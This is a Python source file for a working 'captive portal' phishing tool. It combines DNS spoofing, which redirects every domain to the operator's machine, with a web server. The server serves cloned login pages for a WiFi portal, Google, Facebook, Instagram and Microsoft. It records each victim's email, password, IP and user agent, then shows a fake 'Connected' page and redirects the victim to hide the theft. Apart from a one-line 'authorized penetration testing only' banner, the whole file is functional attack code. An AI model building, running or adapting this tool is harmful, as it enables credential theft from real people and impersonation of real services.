"""
╔══════════════════════════════════════════════════════════════════════╗
║   🎣 Captive Portal / Phishing Engine                                ║
║                                                                      ║
║   Creates a fake WiFi login page that captures credentials.          ║
║   Combines DNS spoofing + web server to serve convincing login       ║
║   pages that look like real WiFi authentication portals.             ║
║                                                                      ║
║   Features:                                                          ║
║     • Multiple phishing templates (WiFi login, Google, Facebook)     ║
║     • Automatic DNS redirection (all HTTP → our portal)              ║
║     • Credential capture and logging                                 ║
║     • Post-capture redirect (send to real site after capture)        ║
║     • Custom template support                                        ║
║     • Device/session tracking                                        ║
║     • Auto-DHCP detection (captive portal trigger)                   ║
║     • Mobile-responsive templates                                    ║
║     • SSL support with self-signed cert                              ║
║                                                                      ║
║   How it works:                                                      ║
║     1. DNS spoofer redirects all domains to our IP                   ║
║     2. Web server serves fake login page                             ║
║     3. Victim enters credentials thinking it's WiFi login            ║
║     4. We capture credentials and redirect to real internet          ║
║                                                                      ║
║   ⚠ For authorized penetration testing only!                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import json
import threading
import socket
import time
import re
from datetime import datetime
from collections import deque, defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus

try:
    from dns_spoofer import DNSSpoofer
    DNS_SPOOF_OK = True
except ImportError:
    DNS_SPOOF_OK = False


# ═══════════════════════════════════════════════════════════════════════
# PHISHING PAGE TEMPLATES
# ═══════════════════════════════════════════════════════════════════════

TEMPLATES = {
    # ─── Generic WiFi Login Portal ──────────────────────────────────
    "wifi_login": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Network - Authentication Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;
align-items:center;justify-content:center;padding:20px}
.container{background:#fff;border-radius:16px;box-shadow:0 25px 50px rgba(0,0,0,0.25);
padding:40px;max-width:420px;width:100%;text-align:center}
.logo{font-size:48px;margin-bottom:8px}
h1{font-size:20px;color:#1a1a2e;margin-bottom:4px;font-weight:700}
.subtitle{color:#666;font-size:14px;margin-bottom:24px}
.wifi-icon{font-size:64px;margin-bottom:16px;display:block}
.form-group{margin-bottom:16px;text-align:left}
label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:4px}
input[type=text],input[type=email],input[type=password]{
width:100%;padding:12px 16px;border:2px solid #e1e5e9;border-radius:8px;font-size:15px;
transition:border-color 0.2s;outline:none}
input:focus{border-color:#667eea}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);
color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;
cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;margin-top:8px}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 15px rgba(102,126,234,0.4)}
.terms{font-size:11px;color:#999;margin-top:16px;line-height:1.4}
.terms a{color:#667eea}
.divider{margin:20px 0;border-top:1px solid #eee;position:relative}
.divider span{background:#fff;padding:0 12px;color:#999;font-size:12px;
position:absolute;top:-8px;left:50%;transform:translateX(-50%)}
.social-btn{display:flex;align-items:center;justify-content:center;gap:8px;
width:100%;padding:12px;border:2px solid #e1e5e9;border-radius:8px;background:#fff;
font-size:14px;font-weight:500;cursor:pointer;margin-bottom:8px;transition:all 0.2s}
.social-btn:hover{background:#f8f9fa;border-color:#667eea}
.network-name{font-weight:700;color:#667eea}
</style>
</head>
<body>
<div class="container">
  <span class="wifi-icon">📶</span>
  <h1>Connect to WiFi Network</h1>
  <p class="subtitle">Authentication required to access <span class="network-name">{{NETWORK_NAME}}</span></p>

  <form method="POST" action="/capture">
    <input type="hidden" name="template" value="wifi_login">
    <div class="form-group">
      <label>Email Address</label>
      <input type="email" name="email" placeholder="your@email.com" required autocomplete="email">
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter password" required>
    </div>
    <button type="submit" class="btn">Connect to Internet</button>

    <div class="divider"><span>or sign in with</span></div>

    <button type="button" class="social-btn" onclick="document.querySelector('[name=email]').focus()">
      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGc+PHBhdGggZD0iTTE3LjY0IDkuMjA0YzAtLjYzOC0uMDU3LTEuMjUyLS4xNjQtMS44NDFIOXYzLjQ4MWg0Ljg0NGEtMS4xNCAxLjE0LTQuODQ0IDMuNjM5IDAtMS45IDE0LjIgMCAwIDAtMS42MzctMS40NGwtMC4wMTUtMC4wMDJWOS4zMDRjMCAuODk3LS4xOTYgMS43OC0uNTggMi41ODdMMTcuNjQgOS4yMDR6IiBmaWxsPSIjNDI4NUY0Ii8+PHBhdGggZD0iTTkgMTguMDAxYzIuNDMgMCA0LjQ2Ny0uODA2IDUuOTU2LTIuMTgxbC0yLjgzMi0yLjE5N2MtLjc4NS41MjktMS43OTIuODQzLTMuMTI0Ljg0My0yLjM5IDAtNC4xMy0xLjYtNC43OTQtMy43NTNIMi4xMDh2Mi4yNjZDMy41OTMgMTYuMTE3IDYuMDkgMTguMDAxIDkgMTguMDAxeiIgZmlsbD0iIzM0QTg1MyIvPjxwYXRoIGQ9Ik00LjIwNiAxMC43MTNhNS41MzMgNS41MzMgMCAwIDEgMC0zLjQyNlY1LjAyMUgyLjEwOGE5LjAxMiA5LjAxMiAwIDAgMCAwIDcuOTU4bDIuMDk4LTIuMjY2eiIgZmlsbD0iI0ZCQkMwNSIvPjxwYXRoIGQ9Ik05IDMuNThjMS4zMjEgMCAyLjUwOC40NTQgMy40NDIgMS4zNDVsMi41ODEtMi41ODFDMTMuNDU2Ljg5MiAxMS40MjEgMCA5IDBhOC45OTggOC45OTggMCAwIDAtNi44OTIgMy4yNDJMNC4yMDYgNS41MDhjLjk2OC0yLjE1IDMuMTQ5LTMuNzI4IDQuNzk0LTMuNzI4eiIgZmlsbD0iI0VBNDMzNSIvPjwvZz48L3N2Zz4=" width="18" height="18">
      Continue with Google
    </button>

    <p class="terms">By connecting, you agree to our <a href="#">Terms of Service</a>
    and <a href="#">Privacy Policy</a>. Your activity may be monitored.</p>
  </form>
</div>
</body>
</html>""",

    # ─── Google Login Clone ─────────────────────────────────────────
    "google": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto',Arial,sans-serif;background:#f0f4f9;
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:#fff;border-radius:28px;max-width:450px;width:100%;
padding:48px 40px 36px;border:1px solid #dadce0}
.google-logo{text-align:center;margin-bottom:16px;font-size:28px;font-weight:500}
.google-logo span:nth-child(1){color:#4285f4}
.google-logo span:nth-child(2){color:#ea4335}
.google-logo span:nth-child(3){color:#fbbc05}
.google-logo span:nth-child(4){color:#4285f4}
.google-logo span:nth-child(5){color:#34a853}
.google-logo span:nth-child(6){color:#ea4335}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}
.subtitle{font-size:16px;color:#202124;text-align:center;margin-bottom:28px}
.form-group{margin-bottom:20px;position:relative}
input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;
font-size:16px;outline:none;transition:border-color 0.2s}
input:focus{border-color:#1a73e8;border-width:2px;padding:13px 15px}
.floating-label{position:absolute;left:16px;top:14px;font-size:16px;color:#5f6368;
pointer-events:none;transition:all 0.2s}
input:focus+.floating-label,input:not(:placeholder-shown)+.floating-label{
top:-8px;left:12px;font-size:12px;background:#fff;padding:0 4px;color:#1a73e8}
.forgot{display:block;font-size:14px;color:#1a73e8;font-weight:500;text-decoration:none;
margin-bottom:24px}
.forgot:hover{text-decoration:underline}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
.create:hover{text-decoration:underline}
.next-btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;
font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;letter-spacing:0.25px}
.next-btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,0.3)}
.info{font-size:12px;color:#5f6368;margin-top:32px;text-align:center;line-height:1.5}
</style>
</head>
<body>
<div class="container">
  <div class="google-logo">
    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
  </div>
  <h1>Sign in</h1>
  <p class="subtitle">to continue to Gmail</p>

  <form method="POST" action="/capture">
    <input type="hidden" name="template" value="google">
    <div class="form-group">
      <input type="text" name="email" placeholder=" " required autocomplete="email">
      <span class="floating-label">Email or phone</span>
    </div>
    <div class="form-group">
      <input type="password" name="password" placeholder=" " required>
      <span class="floating-label">Password</span>
    </div>
    <a href="#" class="forgot">Forgot email?</a>
    <div class="actions">
      <a href="#" class="create">Create account</a>
      <button type="submit" class="next-btn">Next</button>
    </div>
    <p class="info">Not your computer? Use Guest mode to sign in privately.
    <a href="#" style="color:#1a73e8">Learn more about using Guest mode</a></p>
  </form>
</div>
</body>
</html>""",

    # ─── Facebook Login Clone ───────────────────────────────────────
    "facebook": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Log In or Sign Up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;
display:flex;align-items:center;justify-content:center;padding:20px}
.wrapper{display:flex;align-items:center;gap:40px;max-width:980px;width:100%}
.left{flex:1}
.fb-logo{font-size:42px;font-weight:700;color:#1877f2;margin-bottom:12px}
.fb-tagline{font-size:24px;color:#1c1e21;line-height:1.3;font-weight:400}
.right{width:400px}
.login-box{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;text-align:center}
input[type=text],input[type=email],input[type=password]{
width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;
font-size:17px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.login-btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;
border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.login-btn:hover{background:#166fe5}
.forgot{color:#1877f2;font-size:14px;text-decoration:none;display:block;margin-bottom:20px}
.divider{border-top:1px solid #dadde1;margin-bottom:20px}
.create-btn{display:inline-block;padding:12px 20px;background:#42b72a;color:#fff;
border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none}
.create-btn:hover{background:#36a420}
.footer-note{font-size:12px;color:#777;margin-top:20px;text-align:center}
@media(max-width:768px){
.wrapper{flex-direction:column;text-align:center}
.right{width:100%;max-width:400px}
}
</style>
</head>
<body>
<div class="wrapper">
  <div class="left">
    <div class="fb-logo">facebook</div>
    <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
  </div>
  <div class="right">
    <div class="login-box">
      <form method="POST" action="/capture">
        <input type="hidden" name="template" value="facebook">
        <input type="email" name="email" placeholder="Email address or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
        <a href="#" class="forgot">Forgotten password?</a>
        <div class="divider"></div>
        <a href="#" class="create-btn">Create new account</a>
      </form>
    </div>
    <p class="footer-note"><b>Create a Page</b> for a celebrity, brand or business.</p>
  </div>
</div>
</body>
</html>""",

    # ─── Instagram Login Clone ──────────────────────────────────────
    "instagram": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{width:350px}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;margin-bottom:10px;text-align:center}
.ig-logo{font-family:'Billabong',cursive;font-size:40px;margin-bottom:24px;
background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:400}
input{width:100%;padding:10px 12px;margin-bottom:8px;border:1px solid #dbdbdb;
border-radius:3px;font-size:14px;background:#fafafa;outline:none}
input:focus{border-color:#a8a8a8}
.login-btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;
border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.login-btn:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:16px 0}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 16px;color:#8e8e8e;font-size:13px;font-weight:600}
.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;
align-items:center;justify-content:center;gap:6px;margin:12px 0}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:16px}
.signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:16px;text-align:center;font-size:14px}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
  <div class="login-box">
    <div class="ig-logo">Instagram</div>
    <form method="POST" action="/capture">
      <input type="hidden" name="template" value="instagram">
      <input type="text" name="email" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="login-btn">Log in</button>
    </form>
    <div class="divider"><span>OR</span></div>
    <a href="#" class="fb-login">📘 Log in with Facebook</a>
    <a href="#" class="forgot">Forgot password?</a>
  </div>
  <div class="signup-box">
    Don't have an account? <a href="#">Sign up</a>
  </div>
</div>
</body>
</html>""",

    # ─── Microsoft / Office 365 Login Clone ─────────────────────────
    "microsoft": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f2f2f2;
min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.ms-logo{margin-bottom:16px;display:flex;gap:3px}
.ms-logo div{width:10px;height:10px}
.ms-logo .r{background:#f25022}.ms-logo .g{background:#7fba00}
.ms-logo .b{background:#00a4ef}.ms-logo .y{background:#ffb900}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:24px}
input{width:100%;padding:8px 10px;border:none;border-bottom:1px solid #666;
font-size:15px;outline:none;margin-bottom:8px}
input:focus{border-bottom-color:#0067b8}
.info{font-size:13px;color:#1b1b1b;margin:16px 0 24px}
.info a{color:#0067b8;text-decoration:none}
.next-btn{background:#0067b8;color:#fff;border:none;padding:10px 20px;
font-size:15px;cursor:pointer;float:right;min-width:108px}
.next-btn:hover{background:#005da6}
.back-btn{color:#0067b8;font-size:13px;text-decoration:none;line-height:40px}
</style>
</head>
<body>
<div class="container">
  <div class="ms-logo">
    <div class="r"></div><div class="g"></div><br>
    <div class="b"></div><div class="y"></div>
  </div>
  <h1>Sign in</h1>
  <form method="POST" action="/capture">
    <input type="hidden" name="template" value="microsoft">
    <input type="email" name="email" placeholder="Email, phone, or Skype" required>
    <input type="password" name="password" placeholder="Password" required>
    <p class="info">No account? <a href="#">Create one!</a> ·
    <a href="#">Can't access your account?</a></p>
    <button type="submit" class="next-btn">Sign in</button>
  </form>
</div>
</body>
</html>""",
}


# ═══════════════════════════════════════════════════════════════════════
# CAPTIVE PORTAL HTTP HANDLER
# ═══════════════════════════════════════════════════════════════════════

class PortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for the captive portal."""

    portal = None  # Set by CaptivePortal

    def log_message(self, format, *args):
        pass  # Suppress logs

    def do_GET(self):
        """Serve the phishing page."""
        parsed = urlparse(self.path)

        if parsed.path == "/success":
            self._serve_success()
        elif parsed.path in ("/generate_204", "/gen_204", "/hotspot-detect.html",
                             "/ncsi.txt", "/connecttest.txt",
                             "/redirect", "/mobile/status.php"):
            # Captive portal detection endpoints — redirect to our login
            self._redirect_to_portal()
        else:
            self._serve_portal()

    def do_POST(self):
        """Handle form submission (credential capture)."""
        if self.path == "/capture":
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="ignore")

                # Parse form data
                credentials = {}
                for pair in body.split("&"):
                    kv = pair.split("=", 1)
                    if len(kv) == 2:
                        credentials[unquote_plus(kv[0])] = unquote_plus(kv[1])

                # Get client info
                client_ip = self.client_address[0]
                user_agent = self.headers.get("User-Agent", "")

                if self.portal:
                    self.portal._capture_credentials(
                        client_ip, credentials, user_agent,
                        self.headers.get("Host", ""),
                    )

                # Redirect to success page (then to real internet)
                self._redirect_to_success()

            except Exception:
                self._serve_portal()
        else:
            self.send_error(404)

    def _serve_portal(self):
        """Serve the phishing template."""
        if not self.portal:
            self.send_error(500)
            return

        template = self.portal.get_current_template()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_headers()
        self.wfile.write(template.encode("utf-8"))

    def _serve_success(self):
        """Serve success page after credential capture."""
        html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connected!</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,#11998e,#38ef7d);min-height:100vh;
display:flex;align-items:center;justify-content:center;color:#fff}
.box{text-align:center;padding:40px}
.check{font-size:72px;margin-bottom:16px}
h1{font-size:28px;margin-bottom:8px}
p{font-size:16px;opacity:0.9;margin-bottom:24px}
</style>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
</head>
<body>
<div class="box">
  <div class="check">✅</div>
  <h1>Successfully Connected!</h1>
  <p>You now have internet access. Redirecting...</p>
</div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _redirect_to_portal(self):
        """Redirect captive portal detection to our login page."""
        portal_url = f"http://{self.portal.local_ip}:{self.portal.portal_port}/"
        self.send_response(302)
        self.send_header("Location", portal_url)
        self.end_headers()

    def _redirect_to_success(self):
        """Redirect to success page."""
        self.send_response(302)
        self.send_header("Location", "/success")
        self.end_headers()


# ═══════════════════════════════════════════════════════════════════════
# CAPTIVE PORTAL ENGINE
# ═══════════════════════════════════════════════════════════════════════

class CaptivePortal:
    """
    Serves fake login pages and captures credentials.

    Combines DNS spoofing (redirect all traffic to us) with a web server
    serving convincing login pages.

    Usage:
        portal = CaptivePortal(
            interface="wlan0",
            local_ip="192.168.1.100",
            gateway_ip="192.168.1.1",
        )
        portal.set_template("wifi_login", network_name="FreeWiFi")
        portal.start()
    """

    def __init__(self, interface, local_ip, gateway_ip=None,
                 portal_port=80, network_name="Free WiFi"):
        self.interface = interface
        self.local_ip = local_ip
        self.gateway_ip = gateway_ip
        self.portal_port = portal_port
        self.network_name = network_name
        self._running = False
        self._lock = threading.Lock()

        # Template config
        self._template_name = "wifi_login"
        self._custom_template = None

        # DNS Spoofer (redirects all DNS to us)
        self._dns_spoofer = None

        # Captured credentials
        self._credentials = deque(maxlen=500)

        # Session tracking
        self._sessions = defaultdict(lambda: {
            "visits": 0,
            "first_seen": None,
            "last_seen": None,
            "user_agent": "",
            "captured": False,
        })

        # Event log
        self._events = deque(maxlen=500)

        # Stats
        self._stats = {
            "page_views": 0,
            "credentials_captured": 0,
            "unique_visitors": 0,
        }

        # HTTP Server
        self._http_server = None

    # ═══════════════════════════════════════════════════════════════════
    # TEMPLATE MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════

    def set_template(self, template_name, network_name=None, **kwargs):
        """
        Set the phishing template.

        Args:
            template_name: "wifi_login", "google", "facebook", "instagram", "microsoft"
            network_name: WiFi network name to display
        """
        if template_name in TEMPLATES:
            self._template_name = template_name
        if network_name:
            self.network_name = network_name
        self._log(f"Template set: {template_name}")

    def set_custom_template(self, html_content):
        """Set a custom HTML template."""
        self._custom_template = html_content
        self._log("Custom template loaded")

    def get_current_template(self):
        """Get the rendered template HTML."""
        if self._custom_template:
            html = self._custom_template
        else:
            html = TEMPLATES.get(self._template_name, TEMPLATES["wifi_login"])

        # Replace placeholders
        html = html.replace("{{NETWORK_NAME}}", self.network_name)
        return html

    def get_available_templates(self):
        """List available template names."""
        return list(TEMPLATES.keys())

    # ═══════════════════════════════════════════════════════════════════
    # START / STOP
    # ═══════════════════════════════════════════════════════════════════

    def start(self):
        """Start the captive portal."""
        self._running = True

        # Start DNS spoofing (redirect all DNS to our IP)
        if DNS_SPOOF_OK and self.gateway_ip:
            self._dns_spoofer = DNSSpoofer(
                interface=self.interface,
                local_ip=self.local_ip,
                gateway_ip=self.gateway_ip,
            )
            # Redirect ALL domains to our portal
            self._dns_spoofer.add_rule("*", self.local_ip, rule_type="all",
                                        description="Captive Portal - All DNS redirect")
            self._dns_spoofer.start()
            self._log("DNS spoofing STARTED — all domains → portal")

        # Start HTTP server
        self._start_http_server()

        self._log(f"CAPTIVE PORTAL STARTED on port {self.portal_port}")
        self._log(f"Template: {self._template_name}")
        self._log(f"Network: {self.network_name}")

        return True

    def stop(self):
        """Stop the captive portal and DNS spoofing."""
        self._running = False

        if self._dns_spoofer:
            self._dns_spoofer.stop()

        if self._http_server:
            try:
                self._http_server.shutdown()
            except Exception:
                pass

        self._log("CAPTIVE PORTAL STOPPED")

    def _start_http_server(self):
        """Start the portal web server."""
        PortalHandler.portal = self
        try:
            self._http_server = HTTPServer(
                ("0.0.0.0", self.portal_port), PortalHandler
            )
            threading.Thread(
                target=self._http_server.serve_forever,
                daemon=True,
            ).start()
            self._log(f"Portal HTTP server on port {self.portal_port}")
        except Exception as e:
            self._log(f"HTTP server error: {e}")
            # Try alternate port
            try:
                self.portal_port = 8080
                self._http_server = HTTPServer(
                    ("0.0.0.0", self.portal_port), PortalHandler
                )
                threading.Thread(
                    target=self._http_server.serve_forever,
                    daemon=True,
                ).start()
                self._log(f"Portal HTTP server on port {self.portal_port} (fallback)")
            except Exception as e2:
                self._log(f"HTTP server fallback also failed: {e2}")

    # ═══════════════════════════════════════════════════════════════════
    # CREDENTIAL CAPTURE
    # ═══════════════════════════════════════════════════════════════════

    def _capture_credentials(self, client_ip, form_data, user_agent, host):
        """Process captured form submission."""
        now = datetime.now()

        # Extract credentials from form data
        email = form_data.get("email", form_data.get("username", ""))
        password = form_data.get("password", "")
        template = form_data.get("template", self._template_name)

        entry = {
            "time": now.strftime("%H:%M:%S"),
            "timestamp": now.isoformat(),
            "device_ip": client_ip,
            "email": email,
            "password": password,
            "template": template,
            "user_agent": user_agent[:200],
            "host": host,
            "all_fields": {k: v for k, v in form_data.items()
                           if k not in ("template",)},
        }

        with self._lock:
            self._credentials.append(entry)
            self._stats["credentials_captured"] += 1

            # Update session
            session = self._sessions[client_ip]
            session["captured"] = True
            session["last_seen"] = now.isoformat()

        self._log(f"🔑 CREDENTIAL CAPTURED: {client_ip} — "
                  f"Email: {email} | Pass: {'*' * len(password)} | "
                  f"Template: {template}")

    # ═══════════════════════════════════════════════════════════════════
    # PUBLIC API
    # ═══════════════════════════════════════════════════════════════════

    def get_credentials(self, limit=50):
        """Get captured credentials."""
        with self._lock:
            return list(self._credentials)[-limit:]

    def get_sessions(self):
        """Get visitor sessions."""
        with self._lock:
            return dict(self._sessions)

    def get_stats(self):
        """Get portal statistics."""
        with self._lock:
            return {
                **self._stats,
                "template": self._template_name,
                "network_name": self.network_name,
                "portal_url": f"http://{self.local_ip}:{self.portal_port}/",
                "dns_active": self._dns_spoofer is not None and self._dns_spoofer._running,
                "sessions": len(self._sessions),
            }

    def get_events(self, limit=50):
        """Get event log."""
        with self._lock:
            return list(self._events)[-limit:]

    def _log(self, msg):
        """Log an event."""
        with self._lock:
            self._events.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "message": msg,
            })
